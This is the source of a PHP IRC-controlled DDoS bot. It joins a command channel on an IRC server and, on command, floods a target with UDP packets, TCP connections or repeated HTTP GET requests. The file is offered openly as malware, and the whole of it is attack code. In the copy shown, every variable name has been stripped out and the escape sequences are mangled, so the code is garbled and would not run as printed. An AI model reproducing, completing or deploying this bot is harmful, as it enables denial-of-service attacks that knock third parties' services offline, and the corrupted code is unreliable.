<?php


/*


   PHP DDoS Bot
   Version 1.0


*/


="1.3.3.7";
="6667";
="bot-";;
=mt_rand(0,3);
=mt_rand(100000,999999);
="#WauShare";
="ddos";
="Farewell.";

set_time_limit(0);
 = 0;  = 0;
 = fsockopen(, );

while ( = fgets(,512)) {

    = str_replace("n","",);  = str_replace("r","",);
    = explode(" ",);

   if ( == 0) {
     fputs(,"nick nn");
     fputs(,"USER cybercrime 0 * :woopienn");
   }

   if ( == "PING") { fputs(,'PONG '.str_replace(':','',)."n"); }

   if ( == 251) {
     fputs(,"join  n");
     ++;
   }


   if (eregi("bot-op",)) {
    fputs(,"mode  +o n");
   }


   if (eregi("bot-deop",)) {
    fputs(,"mode  -o n");
   }

   if (eregi("bot-quit",)) {
    fputs(,"quit :nn");
    break;
   }

   if (eregi("bot-join",)) {
    fputs(,"join n");
   }

   if (eregi("bot-part",)) {
    fputs(,"part n");
   }


   if (eregi("ddos-udp",)) {
    fputs(,"privmsg  :ddos-udp - started udp flood - nn");
 = fsockopen("udp://", 500, , , 30);
if (!)
{
//echo " ()<br>n"; //troep
exit;
}
else
{
 = "a";
for( = 0;  < 9999999999999; ++)
   = .;

if(fputs (, ) )
  fputs(,"privmsg  :udp-ddos - packets sended.nn");
else
  fputs(,"privmsg  :udp-ddos - <error> sending packets.nn");
}
   }

   if (eregi("ddos-tcp",)) {
    fputs(,"part n");
fputs(,"privmsg  :tcp-ddos - flood : with  sockets.nn");
 = ;
 = ;

for( = 0;  < ; ++)
{
 = fsockopen(, );
}
   }

   if (eregi("ddos-http",)) {
    fputs(,"part n");
fputs(,"privmsg  :ddos-http - http://:  timesnn");
 = ;
 = ;

 = "GET / HTTP/1.1rn";
 .= "Accept: */*rn";
 .= "Accept-Language: nlrn";
 .= "Accept-Encoding: gzip, deflatern";
 .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)rn";
 .= "Host: rn";
 .= "Connection: Keep-Alivernrn";

for( = 0;  < ; ++)
{
 = fsockopen(, );
fwrite(, );
fclose();
}
   }
   ++;

}
?>
